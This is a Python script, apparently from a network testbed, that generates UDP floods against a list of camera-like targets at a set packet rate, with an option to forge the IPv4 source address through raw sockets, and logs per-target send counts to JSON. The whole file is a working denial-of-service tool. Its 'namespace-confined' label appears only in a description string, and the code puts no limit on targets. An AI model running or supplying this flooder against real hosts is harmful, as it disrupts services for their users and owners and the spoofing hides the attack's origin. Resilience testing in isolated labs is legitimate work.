#!/usr/bin/env python3
import argparse
import json
import os
import socket
import struct
import time


def target_sequence(targets, mode):
    if mode == "single_camera":
        while True:
            yield targets[0]
    elif mode == "all_cameras":
        while True:
            for target in targets:
                yield target
    else:
        idx = 0
        while True:
            yield targets[idx % len(targets)]
            idx += 1


def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    words = struct.unpack(f"!{len(data) // 2}H", data)
    total = sum(words)
    total = (total & 0xffff) + (total >> 16)
    total = (total & 0xffff) + (total >> 16)
    return (~total) & 0xffff


def spoofed_udp_packet(source, target, source_port, dest_port, payload, packet_id):
    udp_length = 8 + len(payload)
    udp = struct.pack("!HHHH", source_port, dest_port, udp_length, 0) + payload
    version_ihl = (4 << 4) | 5
    ip = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, 0, 20 + udp_length, packet_id & 0xffff, 0,
        64, socket.IPPROTO_UDP, 0, socket.inet_aton(source), socket.inet_aton(target),
    )
    ip = ip[:10] + struct.pack("!H", checksum(ip)) + ip[12:]
    return ip + udp


def main():
    parser = argparse.ArgumentParser(description="Namespace-confined UDP flood generator")
    parser.add_argument("--targets", required=True)
    parser.add_argument("--port", type=int, default=9000)
    parser.add_argument("--pps", type=int, default=2000)
    parser.add_argument("--duration-sec", type=float, default=30)
    parser.add_argument("--mode", choices=["single_camera", "round_robin", "all_cameras"], default="round_robin")
    parser.add_argument("--payload-bytes", type=int, default=256)
    parser.add_argument("--spoof-source", default="",
                        help="Spoof this IPv4 source (requires CAP_NET_RAW/root)")
    parser.add_argument("--out", required=True)
    args = parser.parse_args()

    targets = [target.strip() for target in args.targets.split(",") if target.strip()]
    payload = b"A" * max(1, args.payload_bytes)
    if args.spoof_source:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    interval = 1.0 / max(1, args.pps)
    next_send = time.perf_counter()
    end = time.time() + args.duration_sec
    sent = 0
    by_target = {target: 0 for target in targets}
    seq = target_sequence(targets, args.mode)

    while time.time() < end:
        target = next(seq)
        try:
            if args.spoof_source:
                packet = spoofed_udp_packet(
                    args.spoof_source, target, 40000 + (sent % 1000),
                    args.port, payload, sent,
                )
                sock.sendto(packet, (target, 0))
            else:
                sock.sendto(payload, (target, args.port))
            sent += 1
            by_target[target] += 1
        except OSError:
            pass
        next_send += interval
        delay = next_send - time.perf_counter()
        if delay > 0:
            time.sleep(delay)

    result = {
        "attack_type": "udp",
        "duration_sec": args.duration_sec,
        "pps_target": args.pps,
        "target_mode": args.mode,
        "spoof_source": args.spoof_source or None,
        "sent": sent,
        "by_target": by_target,
    }
    os.makedirs(os.path.dirname(args.out), exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2, sort_keys=True)


if __name__ == "__main__":
    main()
